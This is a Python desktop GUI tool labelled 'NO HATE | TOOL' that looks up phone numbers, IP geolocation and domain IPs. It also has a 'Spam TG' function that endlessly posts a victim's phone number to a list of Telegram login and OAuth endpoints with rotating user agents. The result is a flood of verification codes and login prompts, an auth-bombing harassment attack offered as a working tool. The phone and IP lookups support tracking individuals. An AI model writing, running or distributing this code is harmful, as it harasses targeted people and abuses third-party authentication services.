import customtkinter
from bs4 import BeautifulSoup
from requests.auth import HTTPProxyAuth
from socket import gethostbyname
import fake_useragent
import threading
import requests
import random
import string
import random
import whois
import time
import json
import os

user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"

#function's
def search_phone(phone: str):
    url = f"https://fincalculator.ru/api/tel/{phone}"
    response = requests.get(url, headers={'User-Agent': user_agent})
    data = json.loads(response.text)
    
    base = {
        "Country": data["country"] if data["country"] != "" else "Не найдено",
        "Region": data["region"] if data["region"] != "" else "Не найдено",
        "Oper": data["operator"] if data["operator"] != "" else "Не найдено"
    }
    return base

def search_ip(ip: str):
    url = f"https://ipinfo.io/{ip}/json"
    response = requests.get(url, headers={'User-Agent': user_agent})
    data = response.json()
    
    base = {
        "Country": data.get('country', "Не найдено"),
        "Region": data.get('region', "Не найдено"),
        "City": data.get('city', "Не найдено"),
        "Org": data.get('org', "Не найдено"),
    }
    return base

def info_site(domen: str):
    ip = gethostbyname(domen.split('/')[2]) if '/' in domen else gethostbyname(domen)
    
    base = {
        "IP": ip,
        
        #soon...
        "date_reg": "?",
        "date_end": "?",
        "Org": "?",
        "Country": "?",
        "City": "?"
    }
    return base

def spam_tg(phone: str):
    urls = [
        'https://translations.telegram.org/auth/request',
        'https://my.telegram.org/auth/send_password',
        'https://oauth.telegram.org/auth?bot_id=5444323279&origin=https%3A%2F%2Ffragment.com&request_access=write&return_to=https%3A%2F%2Ffragment.com%2F',
        'https://oauth.telegram.org/auth?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&request_access=write&return_to=https%3A%2F%2Fbot-t.com%2Flogin',
        'https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
        'https://oauth.telegram.org/auth/request?bot_id=466141824&origin=https%3A%2F%2Fmipped.com&embed=1&request_access=write&return_to=https%3A%2F%2Fmipped.com%2Ff%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
        'https://oauth.telegram.org/auth/request?bot_id=5463728243&origin=https%3A%2F%2Fwww.spot.uz&return_to=https%3A%2F%2Fwww.spot.uz%2Fru%2F2022%2F04%2F29%2Fyoto%2F%23',
        'https://oauth.telegram.org/auth/request?bot_id=1733143901&origin=https%3A%2F%2Ftbiz.pro&embed=1&request_access=write&return_to=https%3A%2F%2Ftbiz.pro%2Flogin',
        'https://oauth.telegram.org/auth/request?bot_id=319709511&origin=https%3A%2F%2Ftelegrambot.biz&embed=1&return_to=https%3A%2F%2Ftelegrambot.biz%2F',
        'https://oauth.telegram.org/auth/request?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&return_to=https%3A%%2Fbot-t.com%2Flogin',
        'https://oauth.telegram.org/auth/request?bot_id=1803424014&origin=https%3A%2F%2Fru.telegram-store.com&embed=1&request_access=write&return_to=https%3A%2F%2Fru.telegram-store.com%2Fcatalog%2Fsearch',
        'https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin',
        'https://oauth.telegram.org/auth/request?bot_id=5082101769&origin=https%3A%2F%2Fauth.smartbotpro.ru&request_access=write&lang=ru&return_to=https%3A%2F%2Fauth.smartbotpro.ru%2Fauth%2Flogin%2F',
        'https://oauth.telegram.org/auth/request?bot_id=366357143&origin=https%3A%2F%2Fwww.botobot.ru&embed=1&request_access=write&lang=ru&return_to=https%3A%2F%2Fwww.botobot.ru%2Fblog%2Fru%2Fvoiti-cherez-telegram-avtorizatsiia-na-saitie-botobot%2F'
    ]
    
    while True:
        for url in urls:
            user = fake_useragent.UserAgent().random
            headers = {'user-agent': user}
        
            requests.post(url, headers=headers, data={'phone': phone})
            time.sleep(0.5)

#Menu
def phone():
    app.destroy()
    phone = customtkinter.CTk()
    phone.geometry("340x350")
    phone.title("NO HATE | TOOL")
    
    entry = customtkinter.CTkEntry(master=phone, placeholder_text="+7XXXXXXXXXX")
    entry.place(x=170, y=230, anchor=customtkinter.CENTER)
    
    textbox = customtkinter.CTkTextbox(master=phone, width=350, corner_radius=0)
    textbox.place(x=175, y=100, anchor=customtkinter.CENTER)
    
    def one():
        textbox.delete(0.0, 'end')
        info = search_phone(entry.get())
        textbox.insert(f"0.0", f'Страна: {info["Country"]} \nРегион: {info["Region"]} \nОператор: {info["Oper"]}')

    button = customtkinter.CTkButton(master=phone, text="Search", command=one)
    button.place(x=170, y=260, anchor=customtkinter.CENTER)
    
    phone.mainloop()

def ip():
    app.destroy()
    
    ip = customtkinter.CTk()
    ip.geometry("340x350")
    ip.title("NO HATE | TOOL")
    
    entry = customtkinter.CTkEntry(master=ip, placeholder_text="IP...")
    entry.place(x=170, y=230, anchor=customtkinter.CENTER)
    
    textbox = customtkinter.CTkTextbox(master=ip, width=350, corner_radius=0)
    textbox.place(x=175, y=100, anchor=customtkinter.CENTER)
    
    def one():
        textbox.delete(0.0, 'end')
        info = search_ip(entry.get())
        textbox.insert(f"0.0", f'Страна: {info["Country"]} \nРегион: {info["Region"]} \nГород: {info["City"]} \nПровайдер: {info["Org"]}')

    button = customtkinter.CTkButton(master=ip, text="Search", command=one)
    button.place(x=170, y=260, anchor=customtkinter.CENTER)
    
    ip.mainloop()

def site():
    app.destroy()
    
    site = customtkinter.CTk()
    site.geometry("340x350")
    site.title("NO HATE | TOOL")
    
    entry = customtkinter.CTkEntry(master=site, placeholder_text="example.com...")
    entry.place(x=170, y=230, anchor=customtkinter.CENTER)
    
    textbox = customtkinter.CTkTextbox(master=site, width=350, corner_radius=0)
    textbox.place(x=175, y=100, anchor=customtkinter.CENTER)
    
    def one():
        textbox.delete(0.0, 'end')
        info = info_site(entry.get())
        textbox.insert(f"0.0", f'IP: {info["IP"]} \nRegistration Date: {info["date_reg"]} \nExpiration Date: {info["date_end"]} \nOrganization: {info["Org"]} \nCounty: {info["Country"]} \nCity: {info["City"]}')

    button = customtkinter.CTkButton(master=site, text="Search", command=one)
    button.place(x=170, y=260, anchor=customtkinter.CENTER)
    
    site.mainloop()

def tg():
    app.destroy()
    
    spam = customtkinter.CTk()
    spam.geometry("400x300")
    spam.title("NO HATE | TOOL")
    
    entry = customtkinter.CTkEntry(master=spam, placeholder_text="+7XXXXXXXXXX")
    entry.place(x=200, y=110, anchor=customtkinter.CENTER)
    
    def one():
        spam_tg(entry.get())

    button = customtkinter.CTkButton(master=spam, text="Apply", command=one)
    button.place(x=200, y=140, anchor=customtkinter.CENTER)
    
    spam.mainloop()

customtkinter.set_appearance_mode("dark")  # Modes: "System" (standard), "Dark", "Light"
customtkinter.set_default_color_theme("dark-blue")  # Themes: "blue" (standard), "green", "dark-blue"

app = customtkinter.CTk()
app.geometry("400x300")
app.title("NO HATE | TOOL")

button = customtkinter.CTkButton(master=app, text="Search By Phone", command=phone)
button.place(x=200, y=110, anchor=customtkinter.CENTER)

button = customtkinter.CTkButton(master=app, text="Search By IP", command=ip)
button.place(x=200, y=140, anchor=customtkinter.CENTER)

button = customtkinter.CTkButton(master=app, text="Info by Site", command=site)
button.place(x=200, y=170, anchor=customtkinter.CENTER)

button = customtkinter.CTkButton(master=app, text="Spam TG", command=tg)
button.place(x=200, y=200, anchor=customtkinter.CENTER)

app.mainloop()
